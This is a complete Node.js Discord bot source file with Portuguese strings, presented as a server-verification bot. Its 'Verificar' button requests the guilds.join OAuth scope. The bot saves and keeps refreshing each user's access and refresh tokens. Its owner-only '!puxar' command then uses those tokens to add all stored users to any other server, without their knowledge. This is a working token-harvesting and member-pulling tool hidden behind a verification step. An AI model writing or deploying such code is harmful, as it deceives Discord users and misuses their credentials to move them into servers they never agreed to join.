const { Client, GatewayIntentBits, Partials, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const express = require('express');
const axios = require('axios');
const fs = require('fs');
const bodyParser = require('body-parser');

const config = {
    TOKEN: process.env.TOKEN || 'SEU_TOKEN_AQUI',
    CLIENT_ID: process.env.CLIENT_ID || 'SEU_CLIENT_ID_AQUI',
    CLIENT_SECRET: process.env.CLIENT_SECRET || 'SEU_CLIENT_SECRET_AQUI',
    REDIRECT_URI: process.env.REDIRECT_URI || 'https://seusite.discloud.app/callback',
    PORT: process.env.PORT || 8080,
    GUILD_ID: process.env.GUILD_ID || 'ID_DO_SERVIDOR',
    ROLE_ID: process.env.ROLE_ID || 'ID_DO_CARGO',
    OWNER_ID: process.env.OWNER_ID || 'SEU_ID'
};

const DB_FILE = 'users.json';
let usersDB = {};
if (fs.existsSync(DB_FILE)) usersDB = JSON.parse(fs.readFileSync(DB_FILE));

function saveUser(userId, accessToken, refreshToken, expiresIn) {
    const expiresAt = Date.now() + (expiresIn * 1000);
    usersDB[userId] = { accessToken, refreshToken, expiresAt };
    fs.writeFileSync(DB_FILE, JSON.stringify(usersDB, null, 2));
}

async function getValidAccessToken(userId) {
    const user = usersDB[userId];
    if (!user) return null;

    if (Date.now() < user.expiresAt - 3600000) {
        return user.accessToken;
    }

    try {
        const response = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
            client_id: config.CLIENT_ID,
            client_secret: config.CLIENT_SECRET,
            grant_type: 'refresh_token',
            refresh_token: user.refreshToken
        }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });

        const { access_token, refresh_token, expires_in } = response.data;
        saveUser(userId, access_token, refresh_token, expires_in);
        return access_token;
    } catch (error) {
        return null;
    }
}

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers, GatewayIntentBits.MessageContent, GatewayIntentBits.GuildMessages],
    partials: [Partials.Channel]
});

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));

app.get('/callback', async (req, res) => {
    const { code } = req.query;
    if (!code) return res.send('Erro: Falta codigo.');

    try {
        const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
            client_id: config.CLIENT_ID,
            client_secret: config.CLIENT_SECRET,
            code,
            grant_type: 'authorization_code',
            redirect_uri: config.REDIRECT_URI,
            scope: 'identify guilds.join'
        }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });

        const { access_token, refresh_token, expires_in } = tokenResponse.data;

        const userResponse = await axios.get('https://discord.com/api/users/@me', {
            headers: { Authorization: `Bearer ${access_token}` }
        });
        const userId = userResponse.data.id;

        saveUser(userId, access_token, refresh_token, expires_in);

        const guild = client.guilds.cache.get(config.GUILD_ID);
        if (guild) {
            await guild.members.add(userId, { accessToken: access_token }).catch(() => {});
            const member = await guild.members.fetch(userId).catch(() => null);
            if (member) await member.roles.add(config.ROLE_ID);
        }

        res.send('<h1>Verificado com sucesso.</h1>');
    } catch (error) {
        res.send('Erro na verificacao.');
    }
});

client.on('messageCreate', async (message) => {
    if (message.author.bot || message.author.id !== config.OWNER_ID) return;

    if (message.content === '!setup') {
        const authUrl = `https://discord.com/api/oauth2/authorize?client_id=${config.CLIENT_ID}&redirect_uri=${encodeURIComponent(config.REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join`;
        
        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setLabel('🔓 Verificar').setStyle(ButtonStyle.Link).setURL(authUrl)
        );
        
        message.channel.send({ 
            content: 'Clique abaixo para se verificar:', 
            components: [row] 
        });
    }

    if (message.content.startsWith('!puxar')) {
        const targetGuildId = message.content.split(' ')[1];
        const targetGuild = client.guilds.cache.get(targetGuildId);
        if (!targetGuild) return message.reply('Servidor nao encontrado.');

        message.reply('Iniciando...');
        
        const users = Object.keys(usersDB);
        for (const userId of users) {
            const validToken = await getValidAccessToken(userId);
            if (validToken) {
                try {
                    await targetGuild.members.add(userId, { accessToken: validToken });
                } catch (e) {}
            }
            await new Promise(r => setTimeout(r, 1000));
        }
        message.channel.send('Finalizado.');
    }
});

app.listen(config.PORT, () => {});
client.login(config.TOKEN);